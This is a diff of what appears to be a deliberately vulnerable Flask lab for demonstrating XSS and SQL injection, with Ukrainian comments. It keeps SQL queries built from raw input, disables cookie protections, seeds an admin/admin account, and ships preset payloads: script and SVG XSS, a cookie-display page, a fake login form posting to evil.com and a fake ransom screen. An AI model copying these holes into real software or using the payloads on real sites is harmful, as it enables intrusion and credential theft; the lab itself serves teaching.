@@ -1,50 +1,321 @@
 import os
 import time
-import psycopg2
+import sqlite3
 from functools import wraps
 from flask import Flask, render_template, request, redirect, url_for, send_from_directory, flash, session, make_response, jsonify
 
 app = Flask(__name__)
 app.secret_key = 'super_secret_key'
 
-# Відключаємо захист кукі
 app.config['SESSION_COOKIE_HTTPONLY'] = False 
 app.config['SESSION_COOKIE_SECURE'] = False
 
 LAST_DB_RESET = time.time()
 
-UPLOAD_FOLDER = 'uploads'
-ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif', 'doc', 'docx', 'mp4'}
+# === ШЛЯХИ ===
+BASE_DIR = os.path.abspath(os.path.dirname(__file__))
+UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
+DB_PATH = os.path.join(BASE_DIR, 'xss_lab.db')
+
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
+ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif', 'doc', 'docx', 'mp4', 'html', 'js', 'svg'}
+
 if not os.path.exists(UPLOAD_FOLDER):
     os.makedirs(UPLOAD_FOLDER)
 
-# --- БАЗА ВІРУСІВ ---
+# === ПРЕСЕТИ ===
 PRESET_FILES = {
-    'test_alert.html': '<script>alert("XSS Successful!")</script><h1>HACKED</h1>',
-    'cookie_stealer.html': '<script>alert("VICTIM COOKIES:\\n" + document.cookie);</script>',
-    'calc.exe': 'FAKE BINARY CONTENT',
+   'test_alert.html': '<script>alert("XSS Successful!")</script><h1>HACKED</h1>',
     'evil_image.svg': '''<svg width="300" height="300" xmlns="http://www.w3.org/2000/svg" onload="alert('XSS IN THE HOUSE!')">
-        <rect width="300" height="300" style="fill:yellow;stroke:black;stroke-width:3" />
-        <text x="50" y="150" font-family="Verdana" font-size="30" fill="black">SVG XSS</text>
+        <polygon points="100,10 200,100 0,100" style="fill:brown;stroke:black;stroke-width:3" />
+        <rect x="25" y="100" width="150" height="100" style="fill:yellow;stroke:black;stroke-width:3" />
+        <rect x="80" y="140" width="40" height="60" style="fill:red;stroke:black;stroke-width:2" />
+        <text x="20" y="230" font-family="Verdana" font-size="20" fill="black">Home Sweet XSS</text>
     </svg>''',
+    'cookie_stealer.html': '''<body style="background:#222; color:#0f0; font-family:monospace;">
+        <h1>COOKIE STEALER 3000</h1>
+        <script>
+            // Виводимо ВСІ кукі, які бачить браузер
+            alert("VICTIM COOKIES FOUND:\\n\\n" + document.cookie);
+            document.write("<h2>STOLEN DATA:</h2><hr>");
+            document.write("<h3>" + document.cookie + "</h3>");
+        </script>
+    </body>''',
     'fake_login.html': '<h2>Session Expired</h2><form action="http://evil.com"><input placeholder="Password" type="password"><button>Login</button></form>',
-    
-    # ВИПРАВЛЕНИЙ СКРИПТ ЗЛОМУ
-    'simulation_hack.html': '''<!DOCTYPE html><html lang="uk"><head><meta charset="UTF-8"><style>body{margin:0;overflow:hidden;background:black;font-family:monospace;user-select:none}#bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1}canvas{display:block}#log{position:absolute;bottom:0;left:0;padding:20px;color:#0f0;z-index:10;pointer-events:none}.box{display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);border:4px solid red;padding:40px;background:rgba(0,0,0,0.9);color:red;text-align:center;box-shadow:0 0 100px red;z-index:9999}.shake{animation:s 0.1s infinite}@keyframes s{0%{transform:translate(calc(-50% + 2px),calc(-50% + 2px))}100%{transform:translate(-50%,-50%)}}</style></head><body><div id="bg"><canvas id="m"></canvas><div id="log"></div></div><div id="box" class="box"><h1>SYSTEM COMPROMISED</h1><h2 id="txt"></h2></div><script>const ctx=document.getElementById('m').getContext('2d');let w=window.innerWidth,h=window.innerHeight;document.getElementById('m').width=w;document.getElementById('m').height=h;const cols=Math.floor(w/14);const y=Array(cols).fill(0);function mat(){ctx.fillStyle='#0001';ctx.fillRect(0,0,w,h);ctx.fillStyle='#0f0';ctx.font='14px monospace';y.forEach((v,i)=>{ctx.fillText(String.fromCharCode(0x30A0+Math.random()*96),i*14,v);y[i]=v>h+Math.random()*10000?0:v+14});}setInterval(mat,35);const cmds=['Root access...','Bypassing FW...','Stealing data...','DONE'];let i=0;function l(){if(i<cmds.length){document.getElementById('log').innerHTML+='> '+cmds[i]+'<br>';i++;setTimeout(l,800)}else{document.getElementById('box').style.display='block';document.getElementById('box').classList.add('shake');document.getElementById('txt').innerText="SEND BITCOIN";}}setTimeout(l,1000);</script></body></html>'''
-}
+    'red_screen.html': '<style>body{background:red!important;}</style><h1>RED SCREEN OF DEATH</h1>',
+    'safe_note.txt': 'This is a safe text file. Nothing to worry about.',
+    'calc.exe': 'FAKE BINARY CONTENT',
+    'simulation_hack.html': '''<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SYSTEM FAILURE</title>
+    <style>
+        body { margin: 0; padding: 0; overflow: hidden; background-color: black; font-family: 'Courier New', monospace; user-select: none; }
+        
+        /* Фон з матрицею */
+        #background-wrapper {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1;
+        }
+        canvas { display: block; position: absolute; top: 0; left: 0; z-index: 0; }
+        
+        /* Логи терміналу */
+        #terminal-log { 
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
+            padding: 20px; box-sizing: border-box; z-index: 10;
+            display: flex; flex-direction: column; justify-content: flex-end; 
+            pointer-events: none;
+        }
+        .log-line { color: #00ff00; font-size: 16px; font-weight: bold; text-shadow: 0 0 5px #00ff00; margin-bottom: 4px; opacity: 0.9; }
 
-# --- DB CONFIG ---
-DB_CONFIG = {
-    'dbname': os.environ.get('POSTGRES_DB', 'xss_demo_db'),
-    'user': os.environ.get('POSTGRES_USER', 'postgres'),
-    'password': os.environ.get('POSTGRES_PASSWORD', 'your_password'), # <--- ВАШ ПАРОЛЬ
-    'host': os.environ.get('DB_HOST', 'localhost')
+        /* Червоне вікно */
+        #hacker-message-box { 
+            display: none; 
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.95); border: 4px solid red; 
+            padding: 40px; width: 90%; max-width: 900px; 
+            text-align: center; box-shadow: 0 0 100px red; z-index: 9999; border-radius: 5px;
+        }
+        
+        .hacker-text { 
+            color: red; font-size: 28px; font-weight: bold; 
+            text-shadow: 0 0 10px red; white-space: pre-wrap; line-height: 1.6;
+            text-transform: uppercase; margin-bottom: 30px;
+        }
+
+        /* Таймер */
+        #timer {
+            font-size: 48px; color: #ff0000; font-weight: bold;
+            text-shadow: 0 0 20px red; background-color: #220000;
+            display: inline-block; padding: 10px 20px; border: 2px solid red;
+            display: none;
+        }
+        
+        /* Анімації */
+        .shake-normal { animation: shake-bg 0.1s infinite; }
+        @keyframes shake-bg { 
+            0% { transform: translate(2px, 2px); } 25% { transform: translate(-2px, -2px); } 
+            50% { transform: translate(-2px, 2px); } 75% { transform: translate(2px, -2px); } 
+            100% { transform: translate(0px, 0px); } 
+        }
+
+        .shake-centered { animation: shake-center 0.08s infinite; }
+        @keyframes shake-center { 
+            0% { transform: translate(calc(-50% + 4px), calc(-50% + 4px)); } 
+            25% { transform: translate(calc(-50% - 4px), calc(-50% - 4px)); } 
+            50% { transform: translate(calc(-50% - 4px), calc(-50% + 4px)); } 
+            75% { transform: translate(calc(-50% + 4px), calc(-50% - 4px)); } 
+            100% { transform: translate(-50%, -50%); } 
+        }
+        
+        /* Кнопка запуску звуку (для обходу політики браузера) */
+        #start-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 99999; background: transparent; cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <!-- Невидимий шар для активації звуку при кліку -->
+    <div id="start-overlay" onclick="enableAudio()"></div>
+
+    <div id="background-wrapper">
+        <canvas id="matrix"></canvas>
+        <div id="terminal-log"></div>
+    </div>
+    
+    <div id="hacker-message-box">
+        <div id="typewriter" class="hacker-text"></div>
+        <div id="timer">01:00:00</div>
+    </div>
+
+    <script>
+        // --- 1. АУДІО СИСТЕМА (ВИПРАВЛЕНО) ---
+        const AudioContext = window.AudioContext || window.webkitAudioContext;
+        let audioCtx = new AudioContext();
+        let audioEnabled = false;
+
+        function enableAudio() {
+            if (audioCtx.state === 'suspended') {
+                audioCtx.resume();
+            }
+            audioEnabled = true;
+            document.getElementById('start-overlay').style.display = 'none';
+        }
+
+        // Звук друкування / басу
+        function playEvilSound() {
+            if (!audioEnabled) return;
+            try {
+                const osc1 = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                
+                osc1.type = 'sawtooth';
+                osc1.frequency.setValueAtTime(100, audioCtx.currentTime);
+                osc1.frequency.exponentialRampToValueAtTime(30, audioCtx.currentTime + 0.3);
+                
+                gain.gain.setValueAtTime(0.5, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3);
+                
+                osc1.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc1.start();
+                osc1.stop(audioCtx.currentTime + 0.3);
+            } catch(e) {}
+        }
+
+        // Звук тікання таймера (ДОДАНО ВІДСУТНЮ ФУНКЦІЮ)
+        function playTick() {
+            if (!audioEnabled) return;
+            try {
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.type = 'square';
+                osc.frequency.value = 800;
+                gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.05);
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.start();
+                osc.stop(audioCtx.currentTime + 0.05);
+            } catch(e) {}
+        }
+
+        // --- 2. МАТРИЦЯ ---
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        
+        let matrixColor = '#0F0'; 
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*';
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; 
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = matrixColor; 
+            ctx.font = fontSize + 'px monospace';
+            
+            for (let i = 0; i < drops.length; i++) {
+                const text = chars[Math.floor(Math.random() * chars.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 35);
+
+        // --- 3. ЛОГИ ---
+        const terminalLog = document.getElementById('terminal-log');
+        const commands = [
+            "Initializing root exploit...", "Loading kernel modules...", "Bypassing firewall rules (Port 443)...",
+            "Handshake with remote host established.", "Accessing memory dump...", "Scanning for saved passwords...",
+            "[SUCCESS] Found 'passwords.txt'", "[SUCCESS] Found 'cookies.sqlite'", "Decrypting RSA keys...",
+            "Injecting payload to system32...", "Disabling Windows Defender...", "Disabling Antivirus...",
+            "Uploading private data (15%)...", "Uploading private data (45%)...", "Uploading private data (89%)...",
+            "Uploading private data (100%)... DONE.", "Formatting C:/ Drive simulation...", "Locking user interface...",
+            "Establishing permanent backdoor...", "SYSTEM COMPROMISED."
+        ];
+
+        let lineIndex = 0;
+        function addLogLine() {
+            if (lineIndex < commands.length) {
+                const line = document.createElement('div');
+                line.className = 'log-line';
+                const timestamp = new Date().toLocaleTimeString();
+                line.innerText = `[${timestamp}] ${commands[lineIndex]}`;
+                terminalLog.appendChild(line);
+                lineIndex++;
+                setTimeout(addLogLine, Math.random() * 100 + 30);
+            } else {
+                setTimeout(triggerFinale, 800);
+            }
+        }
+        setTimeout(addLogLine, 500);
+
+        // --- 4. ФУНКЦІЯ ТАЙМЕРА ---
+        function startTimer() {
+            const timerEl = document.getElementById('timer');
+            timerEl.style.display = 'inline-block';
+            
+            let totalSeconds = 59 * 60 + 59; 
+            
+            setInterval(() => {
+                if (totalSeconds <= 0) {
+                    timerEl.innerText = "00:00:00";
+                    timerEl.style.color = "black";
+                    timerEl.style.backgroundColor = "red";
+                    return;
+                }
+                
+                totalSeconds--;
+                let h = Math.floor(totalSeconds / 3600);
+                let m = Math.floor((totalSeconds % 3600) / 60);
+                let s = totalSeconds % 60;
+                
+                h = h < 10 ? '0' + h : h;
+                m = m < 10 ? '0' + m : m;
+                s = s < 10 ? '0' + s : s;
+                
+                timerEl.innerText = `${h}:${m}:${s}`;
+                playTick(); // ТЕПЕР ЦЕ ПРАЦЮЄ
+                
+            }, 1000);
+        }
+
+        function triggerFinale() {
+            terminalLog.style.display = 'none';
+            matrixColor = '#FF0000';
+            
+            document.getElementById('background-wrapper').className = 'shake-normal';
+            
+            const box = document.getElementById('hacker-message-box');
+            box.style.display = 'block';
+            box.className = 'shake-centered'; 
+            
+            const text = "YOUR PC HAS BEEN HACKED.\\n\\nALL YOUR DATA IS ENCRYPTED.\\nDO NOT TURN OFF YOUR COMPUTER.\\n\\nSEND 1 BITCOIN TO UNLOCK.\\nTIME LEFT:";
+            const typeWriter = document.getElementById('typewriter');
+            let i = 0;
+            
+            function type() {
+                if (i < text.length) {
+                    const char = text.charAt(i);
+                    typeWriter.textContent += char;
+                    if (char !== '\\n' && i % 2 === 0) playEvilSound(); // Звук через раз, щоб не рипіло
+                    i++;
+                    setTimeout(type, 50);
+                } else {
+                    startTimer();
+                }
+            }
+            type();
+        }
+    </script>
+</body>
+</html>'''
 }
 
 def get_db_connection():
-    conn = psycopg2.connect(**DB_CONFIG)
+    conn = sqlite3.connect(DB_PATH)
     return conn
+
+def init_db():
+    conn = get_db_connection()
+    cur = conn.cursor()
+    cur.execute('''CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE NOT NULL, password TEXT NOT NULL, role TEXT DEFAULT 'user');''')
+    cur.execute('''CREATE TABLE IF NOT EXISTS comments (id INTEGER PRIMARY KEY AUTOINCREMENT, content TEXT NOT NULL);''')
+    cur.execute('''CREATE TABLE IF NOT EXISTS files (id INTEGER PRIMARY KEY AUTOINCREMENT, filename TEXT NOT NULL, upload_type TEXT NOT NULL);''')
+    cur.execute("SELECT * FROM users WHERE username = 'admin'")
+    if not cur.fetchone():
+        cur.execute("INSERT INTO users (username, password, role) VALUES ('admin', 'admin', 'admin')")
+    conn.commit()
+    conn.close()
+
+init_db()
 
 def allowed_file(filename):
     return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
@@ -59,6 +330,12 @@ def login_required(f):
         return f(*args, **kwargs)
     return decorated_function
 
+# --- ROUTES ---
+
+@app.route('/uploads/<name>')
+def download_file(name):
+    return send_from_directory(app.config['UPLOAD_FOLDER'], name)
+
 @app.route('/check_db_version')
 def check_db_version():
     return jsonify({'version': LAST_DB_RESET})
@@ -70,9 +347,8 @@ def login():
         username = request.form['username']
         password = request.form['password']
         conn = get_db_connection(); cur = conn.cursor()
-        query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
         try:
-            cur.execute(query)
+            cur.execute(f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'")
             user = cur.fetchone()
             if user:
                 session['user_id'] = user[0]; session['username'] = user[1]; session['role'] = user[3]
@@ -81,7 +357,7 @@ def login():
                 return resp
             else: flash('Invalid credentials', 'danger')
         except Exception as e: flash(f'SQL Error: {e}', 'danger')
-        cur.close(); conn.close()
+        conn.close()
     return render_template('login.html')
 
 @app.route('/logout')
@@ -89,20 +365,20 @@ def logout():
     session.clear()
     return redirect(url_for('login'))
 
-# --- PAGES ---
 @app.route('/dashboard')
 @login_required
 def dashboard():
     return render_template('dashboard.html')
 
-@app.route('/')
+# === ОСЬ ТУТ БУЛА ПОМИЛКА: ДОДАНО methods=['GET', 'POST'] ===
+@app.route('/', methods=['GET', 'POST'])
 @login_required
 def index():
     if request.method == 'POST':
         content = request.form['content']
         conn = get_db_connection(); cur = conn.cursor()
-        cur.execute('INSERT INTO comments (content) VALUES (%s)', (content,))
-        conn.commit(); cur.close(); conn.close()
+        cur.execute('INSERT INTO comments (content) VALUES (?)', (content,))
+        conn.commit(); conn.close()
         return jsonify({'status': 'success', 'message': 'Payload Saved!'})
     return render_template('xss.html', preset_files=PRESET_FILES.keys())
 
@@ -112,40 +388,29 @@ def sqli():
     vuln_result, vuln_error, vuln_query = None, None, ""
     sec_result, sec_query = None, ""
     search_term = ""
-    
     if request.method == 'POST':
         search_term = request.form.get('search', '')
         if search_term:
             conn = get_db_connection()
-            # 1. Vuln
             try:
                 cur = conn.cursor()
                 vuln_query = f"SELECT id, username, role FROM users WHERE username LIKE '%{search_term}%'"
                 cur.execute(vuln_query)
                 vuln_result = cur.fetchall()
-                cur.close()
-            except Exception as e:
-                vuln_error = str(e)
-                conn.rollback()
-            # 2. Secure
+            except Exception as e: vuln_error = str(e)
             try:
                 cur = conn.cursor()
-                sec_query = "SELECT id, username, role FROM users WHERE username LIKE %s"
-                cur.execute(sec_query, (f'%{search_term}%',))
+                cur.execute("SELECT id, username, role FROM users WHERE username LIKE ?", (f'%{search_term}%',))
                 sec_result = cur.fetchall()
-                cur.close()
             except: pass
             conn.close()
-    return render_template('sqli.html', search_term=search_term, 
-                           vuln_result=vuln_result, vuln_error=vuln_error, vuln_query=vuln_query,
-                           sec_result=sec_result, sec_query=sec_query)
+    return render_template('sqli.html', search_term=search_term, vuln_result=vuln_result, vuln_error=vuln_error, vuln_query=vuln_query, sec_result=sec_result, sec_query=sec_query)
 
 @app.route('/stealth')
 @login_required
 def stealth():
     return render_template('stealth.html')
 
-# --- API ---
 VIRUS_SIGNATURES = [b'script', b'alert', b'prompt', b'onerror', b'onload', b'eval', b'javascript']
 
 @app.route('/scan_file', methods=['POST'])
@@ -156,10 +421,8 @@ def scan_file():
     content = file.read().lower()
     detected = [s.decode() for s in VIRUS_SIGNATURES if s in content]
     if detected: return jsonify({'status':'blocked', 'message':f'⛔ BLOCKED: {", ".join(detected)}'})
-    
     file.seek(0)
     file.save(os.path.join(app.config['UPLOAD_FOLDER'], "stealth_"+file.filename))
-    save_file_to_db("stealth_"+file.filename, 'secure')
     return jsonify({'status':'clean', 'message':'✅ CLEAN'})
 
 @app.route('/upload_vulnerable', methods=['POST'])
@@ -188,9 +451,6 @@ def upload_preset():
     fname = request.form.get('filename')
     mode = request.form.get('mode')
     if fname not in PRESET_FILES: return jsonify({'status':'error'})
-    if mode == 'secure' and not allowed_file(fname): return jsonify({'status':'error', 'message':'Blocked'})
-    
-    # ВИПРАВЛЕНО: encoding='utf-8'
     with open(os.path.join(app.config['UPLOAD_FOLDER'], fname), 'w', encoding='utf-8') as f: 
         f.write(PRESET_FILES[fname])
     save_file_to_db(fname, mode)
@@ -200,7 +460,6 @@ def upload_preset():
 @login_required
 def inject_all():
     for f, c in PRESET_FILES.items():
-        # ВИПРАВЛЕНО: encoding='utf-8'
         with open(os.path.join(app.config['UPLOAD_FOLDER'], f), 'w', encoding='utf-8') as file: 
             file.write(c)
         save_file_to_db(f, 'vulnerable')
@@ -211,24 +470,31 @@ def inject_all():
 def reset_db():
     global LAST_DB_RESET
     conn = get_db_connection(); cur = conn.cursor()
-    cur.execute('TRUNCATE comments RESTART IDENTITY;')
-    cur.execute('TRUNCATE files RESTART IDENTITY;')
-    conn.commit(); cur.close(); conn.close()
-    for f in os.listdir(UPLOAD_FOLDER): os.remove(os.path.join(UPLOAD_FOLDER, f))
+    try:
+        cur.execute('DELETE FROM comments;')
+        cur.execute('DELETE FROM files;')
+        cur.execute("DELETE FROM sqlite_sequence WHERE name='comments';")
+        cur.execute("DELETE FROM sqlite_sequence WHERE name='files';")
+        conn.commit()
+    except: conn.rollback()
+    conn.close()
+    for f in os.listdir(UPLOAD_FOLDER):
+        fp = os.path.join(UPLOAD_FOLDER, f)
+        if os.path.isfile(fp): os.remove(fp)
     LAST_DB_RESET = time.time()
     return jsonify({'status':'info', 'message':'DB Cleared'})
 
 def save_file_to_db(name, type):
     conn = get_db_connection(); cur = conn.cursor()
-    cur.execute('INSERT INTO files (filename, upload_type) VALUES (%s, %s)', (name, type))
-    conn.commit(); cur.close(); conn.close()
+    cur.execute('INSERT INTO files (filename, upload_type) VALUES (?, ?)', (name, type))
+    conn.commit(); conn.close()
 
 @app.route('/vulnerable')
 def win_vuln():
     conn = get_db_connection(); cur = conn.cursor()
     cur.execute('SELECT content FROM comments ORDER BY id DESC'); comms = cur.fetchall()
     cur.execute('SELECT filename, upload_type FROM files ORDER BY id DESC'); files = cur.fetchall()
-    cur.close(); conn.close()
+    conn.close()
     return render_template('vulnerable.html', comments=comms, files=files)
 
 @app.route('/secure')
@@ -236,7 +502,7 @@ def win_sec():
     conn = get_db_connection(); cur = conn.cursor()
     cur.execute('SELECT content FROM comments ORDER BY id DESC'); comms = cur.fetchall()
     cur.execute("SELECT filename, upload_type FROM files WHERE upload_type='secure' ORDER BY id DESC"); files = cur.fetchall()
-    cur.close(); conn.close()
+    conn.close()
     return render_template('secure.html', comments=comms, files=files)
 
 if __name__ == '__main__':
